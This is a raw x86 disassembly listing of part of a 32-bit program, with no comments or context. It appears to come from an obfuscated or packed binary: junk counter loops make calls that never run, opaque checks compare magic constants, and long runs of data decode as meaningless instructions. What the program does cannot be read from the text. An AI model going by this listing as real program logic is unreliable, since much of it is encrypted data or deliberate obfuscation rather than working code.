  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0xa2ea310a
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a4a
  401a76:	push   es
  401a77:	addr16 out 0x59,eax
  401a7a:	mov    ds:0xaa6bbda8,eax
  401a7f:	sbb    ebp,DWORD PTR [edx]
  401a81:	rcr    BYTE PTR [esi],1
  401a83:	or     DWORD PTR [edx-0x31c2ea36],0x5e7d4853
  401a8d:	ins    DWORD PTR es:[edi],dx
  401a8e:	jne    0x401a8c
  401a90:	bound  eax,QWORD PTR [ecx]
  401a92:	xchg   edx,eax
  401a93:	mov    bh,0xf2
  401a95:	xchg   ebp,eax
  401a96:	mov    DWORD PTR [edi],esi
  401a98:	lods   eax,DWORD PTR ds:[esi]
  401a99:	xlat   BYTE PTR ds:[ebx]
  401a9a:	xchg   DWORD PTR [ebp-0x27f7b19d],eax
  401aa0:	daa    
  401aa1:	push   edi
  401aa2:	lods   eax,DWORD PTR ds:[esi]
  401aa3:	shl    ebp,1
  401aa5:	sti    
  401aa6:	jns    0x401ae8
  401aa8:	repnz or DWORD PTR [ebx],ebx
  401aab:	lahf   
  401aac:	jle    0x401b29
  401aae:	mov    ch,0x86
  401ab0:	add    al,0x77
  401ab2:	and    al,0x5a
  401ab4:	test   eax,esi
  401ab6:	and    DWORD PTR es:[edx+0x16e17508],0x8ee2b56
  401ac1:	ret    
  401ac2:	aaa    
  401ac3:	ins    DWORD PTR es:[edi],dx
  401ac4:	inc    eax
  401ac5:	leave  
  401ac6:	int    0x62
  401ac8:	xchg   edx,eax
  401ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aca:	aad    0xc4
  401acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401acd:	mov    dl,0xea
  401acf:	mov    ebx,0x543daaad
  401ad4:	in     al,dx
  401ad5:	test   BYTE PTR [edi-0x42],dl
  401ad8:	cmp    al,0xa0
  401ada:	mov    WORD PTR [ebx-0x54],?
  401add:	push   edi
  401ade:	and    eax,edx
  401ae0:	and    al,0xed
  401ae2:	js     0x401aef
  401ae4:	inc    esp
  401ae5:	adc    ecx,DWORD PTR [ebp-0x4496c87c]
  401aeb:	jmp    0xb81c:0xb600d0c9
  401af2:	xchg   ebx,eax
  401af3:	mov    ch,0xb
  401af5:	outs   dx,DWORD PTR ds:[esi]
  401af6:	jmp    0x401b39
  401af8:	mov    ah,0x10
  401afa:	arpl   WORD PTR [esi+0x28],ax
  401afd:	lods   eax,DWORD PTR ds:[esi]
  401afe:	test   eax,0x7dd0a6ce
  401b03:	lock adc eax,0x7fa4e137
  401b09:	dec    edx
  401b0a:	test   eax,0xce3173b4
  401b0f:	dec    eax
  401b10:	pop    ds
  401b11:	mov    ebp,0x8b65e970
  401b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b17:	imul   edi,DWORD PTR [eax+0xea3ce44],0xcea623dd
  401b21:	fnstcw WORD PTR [edx+0x10fe3785]
  401b27:	inc    ebx
  401b28:	push   0xc5a6d7e5
  401b2d:	idiv   DWORD PTR [ebx]
  401b2f:	jge    0x401b06
  401b31:	mov    ebx,esp
  401b33:	dec    ebx
  401b34:	pushf  
  401b35:	fstp   QWORD PTR [ebx-0x48c68485]
  401b3b:	jne    0x401b32
  401b3d:	neg    BYTE PTR [edi+ecx*2]
  401b40:	sub    DWORD PTR [ecx+0x75],edi
  401b43:	xchg   edx,eax
  401b44:	dec    ebp
  401b45:	xor    cl,dh
  401b47:	clc    
  401b48:	lods   al,BYTE PTR ds:[esi]
  401b49:	aad    0x32
  401b4b:	ret    
  401b4c:	out    dx,al
  401b4d:	mov    DWORD PTR [edx+0x74],esp
  401b50:	inc    edx
  401b51:	out    dx,al
  401b52:	frstor [ebx]
  401b54:	mov    al,ds:0xd51d50cc
  401b59:	or     al,0x68
  401b5b:	stc    
  401b5c:	ret    
  401b5d:	sub    ah,BYTE PTR [ebp+0x30]
  401b60:	and    al,0x1b
  401b62:	icebp  
  401b63:	sbb    cl,ch
  401b65:	sbb    eax,0xa0f44cb4
  401b6a:	adc    DWORD PTR [edx],edi
  401b6c:	dec    edx
  401b6d:	jno    0x401b4b
  401b6f:	mov    bh,0x7b
  401b71:	data16 fsubr DWORD PTR [esi-0x4303493c]
  401b78:	mov    eax,ds
  401b7a:	hlt    
  401b7b:	sub    bh,BYTE PTR [esi+0x54fd77d8]
  401b81:	(bad)  
  401b82:	inc    edx
  401b83:	adc    cl,BYTE PTR [eax+0x47c7b0e1]
  401b89:	cld    
  401b8a:	sub    DWORD PTR ss:[ebp+0x6f217658],ebp
  401b91:	cmp    BYTE PTR [ebx],dl
  401b93:	xchg   edi,eax
  401b94:	ins    BYTE PTR es:[edi],dx
  401b95:	sub    BYTE PTR [esp+ecx*2-0x5018e965],ch
  401b9c:	dec    edx
  401b9d:	jbe    0x401b3a
  401b9f:	mov    edx,0x607eba54
  401ba4:	pop    dx
  401ba6:	push   cs
  401ba7:	jnp    0x401bfa
  401ba9:	add    al,0x3a
  401bab:	cmc    
  401bac:	push   ds
  401bad:	and    al,0xb0
  401baf:	(bad)  
  401bb0:	and    BYTE PTR [eax-0x32],dh
  401bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb4:	gs cmc 
  401bb6:	sub    DWORD PTR ds:0x9934bed1,ecx
  401bbc:	scas   al,BYTE PTR es:[edi]
  401bbd:	add    cl,BYTE PTR [edx]
  401bbf:	mov    ss,WORD PTR [eax+0x70]
  401bc2:	daa    
  401bc3:	or     eax,0xb9b830d3
  401bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bc9:	adc    al,bl
  401bcb:	or     eax,0xb94e382a
  401bd0:	(bad)  
  401bd2:	gs pop ss
  401bd4:	inc    edx
  401bd5:	mov    WORD PTR [edi-0x43],?
  401bd8:	std    
  401bd9:	push   edx
  401bda:	je     0x401c58
  401bdc:	lods   al,BYTE PTR ds:[esi]
  401bdd:	les    eax,FWORD PTR [ecx+0x3a]
  401be0:	cmp    eax,0x8f032369
  401be5:	pcmpgtd mm2,QWORD PTR cs:[eax]
  401be9:	mov    fs,WORD PTR [ebp+eiz*2-0x5d1c31c9]
  401bf0:	imul   ebp,eax,0x2a
  401bf3:	sbb    al,0x7c
  401bf5:	or     ebp,ebx
  401bf7:	stc    
  401bf8:	jp     0x401c0d
  401bfa:	lea    eax,[esi]
  401bfc:	imul   esi,DWORD PTR [edx+0x5c],0x5e
  401c00:	(bad)  
  401c01:	sub    edx,DWORD PTR [edx-0x6c725659]
  401c07:	mov    DWORD PTR [edx-0x2c420308],esi
  401c0d:	call   0x242d5762
  401c12:	mov    DWORD PTR [ebx+0x3c],edi
  401c15:	push   ebp
  401c16:	push   edx
  401c17:	into   
  401c18:	push   cs
  401c19:	out    dx,eax
  401c1a:	int3   
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	dec    eax
  401c91:	jno    0x401c40
  401c93:	mov    esp,0x7e7e0630
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cb6
  401c9d:	push   esp
  401c9e:	out    0xaa,eax
  401ca0:	sbb    DWORD PTR [bx+si+0x55d],ecx
  401ca5:	cwde   
  401ca6:	pop    esp
  401ca7:	mov    eax,ds:0x65b4011c
  401cac:	(bad)  
  401cad:	xchg   ebp,eax
  401cae:	mov    eax,DWORD PTR [edx]
  401cb0:	or     edx,esi
  401cb2:	addr16 hlt 
  401cb4:	in     al,0x24
  401cb6:	aaa    
  401cb7:	jg     0x401cf3
  401cb9:	ret    0x8e9a
  401cbc:	mov    edi,0x94ef1d65
  401cc1:	and    BYTE PTR [esi],dl
  401cc3:	mov    al,0x2a
  401cc5:	xchg   edx,eax
  401cc6:	loopne 0x401cbd
  401cc8:	inc    eax
  401cc9:	xor    bh,bl
  401ccb:	mov    BYTE PTR [ebp-0x22],0xc4
  401ccf:	hlt    
  401cd0:	(bad)  [edx]
  401cd2:	cmp    ebx,esi
  401cd4:	leavew 
  401cd6:	mov    ch,0x20
  401cd8:	inc    edi
  401cd9:	adc    bl,bl
  401cdb:	rol    BYTE PTR [eax+0x2991ce11],1
  401ce1:	cmp    esi,DWORD PTR [eax+0x7b]
  401ce4:	inc    edi
  401ce5:	push   edi
  401ce6:	jo     0x401d28
  401ce8:	popa   
  401ce9:	imul   edi,edi,0x36
  401cec:	inc    ecx
  401ced:	fimul  DWORD PTR ds:0x39f87370
  401cf3:	push   0xffffff87
  401cf5:	das    
  401cf6:	mov    bh,0x37
  401cf8:	push   0x27
  401cfa:	sbb    al,0xcd
  401cfc:	out    dx,eax
  401cfd:	fsubr  QWORD PTR [ecx]
  401cff:	mov    ds:0xf8b34a9d,al
  401d04:	imul   esi,DWORD PTR [ecx+0x22],0xba17af51
  401d0b:	sub    eax,0x6771f34f
  401d10:	mov    esi,0x6f9a5787
  401d15:	push   ecx
  401d16:	into   
  401d17:	and    bh,BYTE PTR [esi*2+0x6c3ecda5]
  401d1e:	in     eax,0xb7
  401d20:	(bad)  
  401d21:	push   esp
  401d22:	in     al,0x57
  401d24:	pop    ecx
  401d25:	cmp    ch,BYTE PTR [ecx+0x2a]
  401d28:	and    eax,0x6ed896da
  401d2d:	mov    ss,WORD PTR [ecx+ecx*4+0x2c]
  401d31:	addr16 pop esp
  401d33:	ror    DWORD PTR [ecx],0x18
  401d36:	or     dl,BYTE PTR [ecx-0x18]
  401d39:	mov    bh,0x66
  401d3b:	neg    BYTE PTR [eax]
  401d3d:	mov    eax,ds:0x855c36c9
  401d42:	and    edx,DWORD PTR [esi+0x6d3dd9e]
  401d48:	adc    al,0x83
  401d4a:	stc    
  401d4b:	sahf   
  401d4c:	fwait
  401d4d:	outs   dx,BYTE PTR ds:[esi]
  401d4e:	inc    ebp
  401d4f:	jge    0x401da9
  401d51:	jp     0x401d03
  401d53:	fdiv   DWORD PTR ds:0x628acc4e
  401d59:	int3   
  401d5a:	cdq    
  401d5b:	int    0x30
  401d5d:	xchg   ebx,eax
  401d5e:	add    ebp,DWORD PTR [esi]
  401d60:	or     bl,bh
  401d62:	gs push ebp
  401d64:	sahf   
  401d65:	pop    es
  401d66:	mov    ah,0x56
  401d68:	push   0xffffffa0
  401d6a:	(bad)  
  401d6b:	cmp    esi,DWORD PTR [ecx+0x7e]
  401d6e:	mov    ebx,0x7d150368
  401d73:	in     eax,dx
  401d74:	push   0xffffffa1
  401d76:	test   al,0x10
  401d78:	ret    
  401d79:	pop    ebx
  401d7a:	push   0x2a
  401d7c:	ficomp DWORD PTR [edx+0x51]
  401d7f:	icebp  
  401d80:	push   ds
  401d81:	push   0xffffffe0
  401d83:	mov    dh,0xa0
  401d85:	push   edi
  401d86:	fwait
  401d87:	pop    ebp
  401d88:	sbb    ecx,esp
  401d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8b:	lahf   
  401d8c:	test   eax,0x8c2bea07
  401d91:	cld    
  401d92:	sbb    ch,BYTE PTR [esi-0x2019ed37]
  401d98:	sub    cl,BYTE PTR [edx]
  401d9a:	pop    esp
  401d9b:	dec    ebp
  401d9c:	sbb    ebx,esi
  401d9e:	std    
  401d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401da0:	int    0xe6
  401da2:	ins    DWORD PTR es:[edi],dx
  401da3:	mov    edx,0x1bd9c2a0
  401da8:	sbb    DWORD PTR [eax-0x42ba12ca],0xffffffbf
  401daf:	out    dx,eax
  401db0:	add    DWORD PTR [esp+ecx*1+0x7f75cd3a],0xfcdf8640
  401dbb:	inc    esi
  401dbc:	mov    eax,cs:0xf9cd39f6
  401dc2:	xor    DWORD PTR [eax+0x5c],ecx
  401dc5:	jo     0x401df1
  401dc7:	push   ebp
  401dc8:	cli    
  401dc9:	retf   
  401dca:	imul   ebx,ebx,0x26
  401dcd:	sbb    BYTE PTR [edx+0x7a],bl
  401dd0:	mov    ebx,0xbfb9746f
  401dd5:	xlat   BYTE PTR ds:[ebx]
  401dd6:	mov    edx,0x8db2f5b9
  401ddb:	jae    0x401db1
  401ddd:	mov    eax,ds:0xf07148e7
  401de2:	push   ebp
  401de3:	call   0xfbc893de
  401de8:	lahf   
  401de9:	jbe    0x401dbc
  401deb:	jle    0x401dfa
  401ded:	ins    BYTE PTR es:[edi],dx
  401dee:	js     0x401de4
  401df0:	xchg   eax,esi
  401df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401df3:	jne    0x401d7b
  401df5:	xchg   ch,dh
  401df7:	adc    BYTE PTR [ecx],bl
  401df9:	cld    
  401dfa:	(bad)  
  401dfc:	pop    esp
  401dfd:	adc    eax,0x5628f670
  401e02:	and    al,0x5
  401e04:	mov    ebx,DWORD PTR [esi+ebp*4+0x289eb55d]
  401e0b:	inc    ebx
  401e0c:	mov    BYTE PTR [ecx+ecx*4-0x635f36cf],ch
  401e13:	int3   
  401e14:	inc    edx
  401e15:	fild   DWORD PTR [eax]
  401e17:	sub    ebx,DWORD PTR [edi-0x7ca6da48]
  401e1d:	sub    eax,0x8c320404
  401e22:	dec    esi
  401e23:	shr    ebp,1
  401e25:	dec    esi
  401e26:	or     BYTE PTR [esi+0xbdf8b03],dh
  401e2c:	call   0xcf20:0xa945954c
  401e33:	dec    edi
  401e34:	and    dh,bh
  401e36:	mov    al,ds:0x574f1872
  401e3b:	test   edi,ebx
  401e3d:	addr16 out 0xbb,al
  401e40:	loop   0x401ea3
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	loopne 0x401e10
  401e82:	ja     0x401e9d
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e2c
  401e8d:	adc    al,BYTE PTR [esi+0x72]
  401e90:	and    BYTE PTR [edx],0xbf
  401e93:	jne    0x401e39
  401e95:	jae    0x401e39
  401e97:	xor    BYTE PTR [ecx-0x4025aae2],cl
  401e9d:	loop   0x401e2e
  401e9f:	jnp    0x401eea
  401ea1:	fsubp  st(2),st
  401ea3:	add    al,0xe7
  401ea5:	add    cl,BYTE PTR [esi+0x26]
  401ea8:	cmc    
  401ea9:	push   cs
  401eaa:	loopne 0x401eba
  401eac:	stc    
  401ead:	scas   eax,DWORD PTR es:[edi]
  401eae:	sbb    al,0x60
  401eb0:	dec    ebx
  401eb1:	add    BYTE PTR [ebx+0x3728e68],cl
  401eb7:	adc    al,0x11
  401eb9:	repz shl DWORD PTR [esi+0x60],1
  401ebd:	sbb    bh,BYTE PTR [eax]
  401ebf:	les    edi,FWORD PTR [esi-0x542673c4]
  401ec5:	div    edi
  401ec7:	lock or ebp,DWORD PTR [esi-0x2b]
  401ecb:	leave  
  401ecc:	pop    ss
  401ecd:	mov    edx,DWORD PTR [ecx-0x52]
  401ed0:	ret    0x186d
  401ed3:	outs   dx,BYTE PTR ds:[esi]
  401ed4:	add    esi,esi
  401ed6:	or     eax,0x503e014e
  401edb:	push   ebp
  401edc:	xor    edi,DWORD PTR [ebx+0x1fe80a82]
  401ee2:	inc    edx
  401ee3:	aam    0x52
  401ee5:	pop    esp
  401ee6:	pop    ebx
  401ee7:	les    esp,FWORD PTR [ecx+0xad4e2d7]
  401eed:	int    0x7f
  401eef:	push   ss
  401ef0:	outs   dx,DWORD PTR ds:[esi]
  401ef1:	xchg   esi,eax
  401ef2:	cmp    eax,0x3a11d81a
  401ef7:	pushf  
  401ef8:	add    dl,BYTE PTR [edx-0x4f]
  401efb:	inc    edx
  401efc:	popa   
  401efd:	jbe    0x401eeb
  401eff:	jbe    0x401eb4
  401f01:	or     BYTE PTR [edx+0x5a],ah
  401f04:	or     dl,bh
  401f06:	jae    0x401ecf
  401f08:	push   eax
  401f09:	or     al,0xe9
  401f0b:	mov    ah,0xec
  401f0d:	adc    ah,ch
  401f0f:	into   
  401f10:	shl    DWORD PTR [ecx+0x13],1
  401f13:	push   ebx
  401f14:	and    eax,0xac4e89db
  401f19:	sub    DWORD PTR [eax],esp
  401f1b:	fcomp  DWORD PTR [esi-0x5ae19d21]
  401f21:	test   eax,0x9ab9988e
  401f26:	test   BYTE PTR [esi-0x5e],0x33
  401f2a:	xchg   ebx,eax
  401f2b:	adc    ah,BYTE PTR [edx+0x55a30ada]
  401f31:	(bad)  
  401f32:	shl    BYTE PTR [esi],1
  401f34:	xchg   ebp,eax
  401f35:	dec    esp
  401f36:	js     0x401f70
  401f38:	aam    0x27
  401f3a:	(bad)  
  401f3c:	nop
  401f3d:	popa   
  401f3e:	cs mov edi,0x8b2497f0
  401f44:	(bad)  [esi]
  401f46:	xor    BYTE PTR [esi+0x24],cl
  401f49:	inc    edi
  401f4a:	loop   0x401f55
  401f4c:	sbb    DWORD PTR [esi+0x22],eax
  401f4f:	loope  0x401fb0
  401f51:	pop    ss
  401f52:	imul   edi,DWORD PTR [ebp+0x6edba39f],0x1c
  401f59:	push   ebp
  401f5a:	dec    esp
  401f5b:	inc    esi
  401f5c:	cmp    esp,edx
  401f5e:	imul   edx,DWORD PTR [eax+ecx*8-0x3d],0xffffffa6
  401f63:	pop    ebp
  401f64:	cli    
  401f65:	cmp    BYTE PTR [ecx],bl
  401f67:	cmp    bh,bh
  401f69:	xor    BYTE PTR [ebp-0x26],0x99
  401f6d:	ins    DWORD PTR es:[edi],dx
  401f6e:	adc    DWORD PTR [esi-0x515e6097],ebp
  401f74:	inc    esi
  401f75:	xor    DWORD PTR [eax+0x43],eax
  401f78:	mov    ?,eax
  401f7a:	xor    eax,0xb5d675f9
  401f7f:	inc    ebp
  401f80:	cmc    
  401f81:	loop   0x401f50
  401f83:	loope  0x401f1a
  401f85:	sub    dl,dh
  401f87:	lods   eax,DWORD PTR ds:[esi]
  401f88:	out    dx,eax
  401f89:	mov    ah,0xd4
  401f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8c:	int    0x37
  401f8e:	pusha  
  401f8f:	push   edi
  401f90:	das    
  401f91:	jb     0x401f8e
  401f93:	push   ebx
  401f94:	or     dh,ah
  401f96:	push   ecx
  401f97:	sbb    eax,0xf9f19d59
  401f9c:	or     al,0x81
  401f9e:	mov    ah,0x4c
  401fa0:	test   al,0xf0
  401fa2:	dec    ecx
  401fa3:	adc    eax,0x1a30ae54
  401fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fa9:	and    eax,0xd16c11cb
  401fae:	daa    
  401faf:	mov    dl,0x31
  401fb1:	dec    edx
  401fb2:	inc    edx
  401fb3:	dec    esi
  401fb4:	rcl    BYTE PTR [edx+0x3207f609],1
  401fba:	push   ds
  401fbb:	fistp  QWORD PTR [eax+0x5b]
  401fbe:	xchg   ecx,eax
  401fbf:	and    eax,0xc9910955
  401fc4:	stos   BYTE PTR es:[edi],al
  401fc5:	out    dx,eax
  401fc6:	inc    ebx
  401fc7:	aaa    
  401fc8:	mov    ebx,fs
  401fca:	jns    0x401f8c
  401fcc:	inc    edx
  401fcd:	test   BYTE PTR [ecx],ch
  401fcf:	ins    DWORD PTR es:[edi],dx
  401fd0:	test   BYTE PTR [ebx+edx*8],0xa6
  401fd4:	ins    DWORD PTR es:[edi],dx
  401fd5:	cli    
  401fd6:	mov    dl,dh
  401fd8:	and    al,0xa6
  401fda:	(bad)  
  401fdb:	int    0x58
  401fdd:	or     DWORD PTR [ecx-0x7420117a],ebx
  401fe3:	sbb    eax,0xffffffdd
  401fe6:	ror    DWORD PTR [esi+0x70874c5a],1
  401fec:	xchg   ecx,eax
  401fed:	mov    edi,0x8c01b331
  401ff2:	fwait
  401ff3:	cmp    ah,BYTE PTR [ebp+0x68]
  401ff6:	jns    0x402042
  401ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff9:	dec    esi
  401ffa:	lock and esi,DWORD PTR [ebp-0x1f62430e]
  402001:	sti    
  402002:	xchg   edi,eax
  402003:	stc    
  402004:	cld    
  402005:	mov    ecx,0x3e6c1f9b
  40200a:	rcl    DWORD PTR [edi-0x2d179877],1
  402010:	push   edi
  402011:	inc    ecx
  402012:	and    al,0x2f
  402014:	(bad)  
  402015:	dec    eax
  402016:	(bad)  
  402017:	jno    0x401fe5
  402019:	push   ds
  40201a:	les    eax,FWORD PTR [eax-0x5d8cce45]
  402020:	mov    esp,0xb1c87998
  402025:	adc    BYTE PTR [eax+ecx*2+0x46e715a9],bh
  40202c:	pop    ebx
  40202d:	xchg   esi,eax
  40202e:	test   al,0x33
  402030:	repz jle 0x402036
  402033:	(bad)  
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
